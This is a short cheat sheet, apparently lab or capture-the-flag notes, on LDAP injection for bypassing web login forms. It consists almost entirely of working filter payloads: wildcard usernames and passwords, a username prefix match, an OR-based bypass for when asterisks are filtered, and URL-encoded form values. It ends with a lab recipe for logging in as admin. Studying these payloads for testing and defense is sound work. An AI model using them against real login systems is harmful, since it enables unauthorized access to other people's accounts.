# LDAP - Authentication Bypass

Basic LDAP injection to bypass web logins backed by directory servers (OpenLDAP/AD). If user input is concatenated into a search filter, wildcards and boolean composition can force matches without knowing a password.

## Foundation

Typical login filter (username + password):

```ldap
(&(uid=<USER>)(userPassword=<PASS>))
```

Other attributes may be used (e.g., `cn` instead of `uid`).

## Exploitation

### Wildcard password (known username)

```ldap
(&(uid=admin)(userPassword=*))
```

- Set username to a valid user (e.g., `admin`), password to `*`.
- `*` matches any value; filter returns the user → login succeeds.

### Wildcard both (unknown username)

```ldap
(&(uid=*)(userPassword=*))
```

- Matches all entries with both attributes → app often logs in as the first returned user.

### Username prefix (partial knowledge)

```ldap
(&(uid=admin*)(userPassword=*))
```

- Matches any user whose `uid` starts with `admin`.

### Without wildcards (asterisk filtered)

Inject OR with a universal true `(&)` to neutralize password check:

- Username payload: `admin)(|(&`
- Password: any (e.g., `abc`)

Effective filter:

```ldap
(&(uid=admin)(|(&)(userPassword=abc)))
```

- `(|(&)(...))` is true regardless of the wrong password → login as `admin`.

## URL-encoded examples (POST form)

- Username: `admin%29%28%7C%28%26`
- Password: `abc%29`

## Lab-style task

- If hint says high-privilege username includes "admin":
  - Username: `admin*`
  - Password: `*`
- Resulting filter:

```ldap
(&(uid=admin*)(userPassword=*))
```

The app should redirect to a post-login page; flag is presented there. Redact the flag in notes.

## Tips

- Escape/encode for HTTP forms when needed.
- Some apps map `cn`, `mail`, or `sAMAccountName` instead of `uid`.
- If filter wraps in additional ANDs, similar ideas apply: place OR at the right depth.
- Prefer allow-listed, fixed attribute choices on the defense side (see prevention note).
